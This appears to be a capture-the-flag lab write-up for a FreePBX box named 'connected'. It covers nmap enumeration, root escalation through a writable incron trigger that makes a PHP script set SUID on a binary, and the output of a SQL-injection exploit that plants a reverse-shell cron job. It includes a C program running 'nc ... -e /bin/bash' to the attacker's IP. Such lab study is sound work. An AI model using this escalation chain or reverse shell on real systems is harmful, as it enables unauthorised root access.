# enumeration 
```
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap -sC -sV 10.129.24.96
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-14 16:51 +0100
Nmap scan report for 10.129.24.96 (10.129.24.96)
Host is up (0.076s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.24 seconds

```



## we look first for any writable files by others
o mean others and w mean writable


```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/proc
/sys/fs/cgroup/memory/cgroup.event_control
/etc/firewall-4.rules
/etc/firewall-6.rules
/usr/local/asterisk/ha_trigger
cd /usr/local/asterisk/

```


## we found out that there is conjob service called  incron

```
cd /etc/incron.d
ls
legacy
local
sysadmin
ls -al
total 24
drwxr-xr-x.   2 root root   49 Nov 30  2025 .
drwxr-xr-x. 119 root root 8192 Jun 14 17:03 ..
-rwxr-xr-x.   1 root root  619 Apr 15  2021 legacy
-rwxr-xr-x.   1 root root   80 Apr 15  2021 local
-rwxr-xr-x.   1 root root   91 Apr 15  2021 sysadmin
cat *
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

```

[[BOXES/06. connected/attachments/06c8eadc1b2ed0e2c6987444dac51a8e_MD5.jpg|Open: Pasted image 20260614193546.png]]
![[BOXES/06. connected/attachments/06c8eadc1b2ed0e2c6987444dac51a8e_MD5.jpg]]
## the file that trigger if we modify that directory or file 

```
cat /usr/sbin/sysadmin_ha
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
	require_once($i);
	$incron = new incron;
	$incron->rootTrigger();
}

```

so when we modify file "/usr/local/asterisk/ha_trigger" the priviouse file get executed witch lunch rootTrigger()


```
<?php
$binaryPath = "/home/asterisk/c";
$newOwner = "root"; // or another username

// chown() returns true on success, false on failure
if (chown($binaryPath, $newOwner)) {
    echo "Success: Owner changed to $newOwner.\n";
} else {
    echo "Error: Failed to change owner. The script likely lacks root privileges.\n";
}
if (chmod($binaryPath, 04777)) {
    echo "SUID bit successfully set on " . $binaryPath;
} else {
    echo "Failed to set permissions. Check process privileges.";
}
?>
```

i create a c file that give me shell

```

┌──(mracherr㉿serveur)-[~]
└─$ cat c.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("nc 10.10.16.224 7777 -e /bin/bash");
    return 0;
}

┌──(mracherr㉿serveur)-[~]
└─$ gcc c.c -o c -static

```

we i trigger incron job by modifying the file .php file get executed 

```
echo "trigger" > /usr/local/asterisk/ha_trigger
```

# and the permission in c binairy get changed 
[[BOXES/06. connected/attachments/2534cae3b6d9a4e4ff0dc8a51b04ae87_MD5.jpg|Open: Pasted image 20260615102740.png]]
![[BOXES/06. connected/attachments/2534cae3b6d9a4e4ff0dc8a51b04ae87_MD5.jpg]]

## and when i get executed it give the shell 
[[BOXES/06. connected/attachments/1f8b5d2e90ce01ce7b2a46d70049082a_MD5.jpg|Open: Pasted image 20260615102830.png]]
![[BOXES/06. connected/attachments/1f8b5d2e90ce01ce7b2a46d70049082a_MD5.jpg]]

```

```


```
<?php $filename = 'helper_tool'; // 1. Create the file and write content $content = "#!/bin/bash\necho 'Running task...'"; file_put_contents($filename, $content); // // 2. Set permissions: 04000 (SUID) + 00755 (rwxr-xr-x) = 04755 // Note: The leading zero is mandatory in PHP to represent an octal number. if (chmod($filename, 04755)) { echo "SUID bit successfully set on " . $filename; } else { echo "Failed to set permissions. Check process privileges."; } ?>
```

# FreePBX 16.0.40.7 exploit

[[BOXES/06. connected/attachments/476d6f57583d385bc0d7b472ad06b51b_MD5.jpg|Open: Pasted image 20260614174954.png]]
![[BOXES/06. connected/attachments/476d6f57583d385bc0d7b472ad06b51b_MD5.jpg]]

[[BOXES/06. connected/attachments/e87b590fd94379839873af27cbe33a1f_MD5.jpg|Open: Pasted image 20260614174928.png]]
![[BOXES/06. connected/attachments/e87b590fd94379839873af27cbe33a1f_MD5.jpg]]

```
┌──(mracherr㉿serveur)-[/tmp]
└─$ python exploit.py http://connected.htb -i tun0 -p 9001
[*] Listener address: 10.10.16.224:9001 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:9001
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jwpngutv' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.24.96:56200 !
[+] Removed cron job 'jwpngutv' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/


NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:ED:1F:DD | 10.129.24.96              |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit:
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

< 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || /bin/bash -i
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/


NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:ED:1F:DD | 10.129.24.96              |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit:
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ howami
howami
bash: howami: command not found
[asterisk@connected ~]$ whoami
whoami
asterisk
[asterisk@connected ~]$ pwd
pwd
/home/asterisk
[asterisk@connected ~]$ ls
ls
user.txt
[asterisk@connected ~]$ cat user.txt
cat user.txt
46f066253a4293368c7d9c9f48c04959
[asterisk@connected ~]$

```